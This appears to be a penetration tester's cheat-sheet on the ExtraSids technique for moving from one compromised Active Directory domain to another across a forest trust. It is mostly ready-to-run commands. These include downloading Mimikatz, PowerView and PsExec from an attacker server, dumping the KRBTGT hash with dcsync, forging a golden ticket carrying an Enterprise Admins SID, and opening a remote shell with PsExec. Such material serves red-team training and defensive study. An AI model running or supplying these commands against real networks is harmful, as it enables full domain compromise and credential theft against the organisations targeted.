# <h1 align="center" id="heading">ExtraSids</h1>
If I have compromised one domain that has intra-forest trust to another domain, I can leverage ExtraSids to compromise that domain as well. I will start off by downloading Mimikatz to the target and dumping the KRBTGT NTLM hash with the following commands:
```powershell
wget http://<attacker server>/mimikatz64.exe -outfile c:\windows\tasks\mimikatz64.exe
```
```powershell
c:\windows\tasks\mimikatz64.exe
```
```powershell
privilege::debug
```
```powershell
token::elevate
```
```powershell
lsadump::dcsync /domain:<current domain> /user:<domain>\krbtgt
```
I need to collect the SIDs for my current domain and the target domain with the following commands:
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker server>/PowerView.ps1');Get-DomainSID -Domain <current domain>
```
```powershell
iex(new-object system.net.webclient).downloadstring('http://<attacker server>/PowerView.ps1');Get-DomainSID -Domain <target domain>
```
I will also need to transfer PSExec to the target system with the following command:
```powershell
wget http://http://<attacker server>/PsExec64.exe -outfile PsExec64.exe
```
I will now use the following Mimikatz command to forge a Golden Ticket to PTT to the target domain **(NOTE: APPEND -519 to TARGET SID)**
```console
mimikatz64.exe
```
```console
privilege::debug
```
```console
kerberos::golden /user:<domain user> /domain:<current domain> /sid:<current domain sid> /krbtgt:<krbtgt ntlm hash> /sids:<target domain sid>-519 /ptt
```
After successfully passing the Golden Ticket to the new target Domain Controller, I can run the following command to establish a cmd.exe session:
```console
PsExec64.exe \\<target system> cmd
```
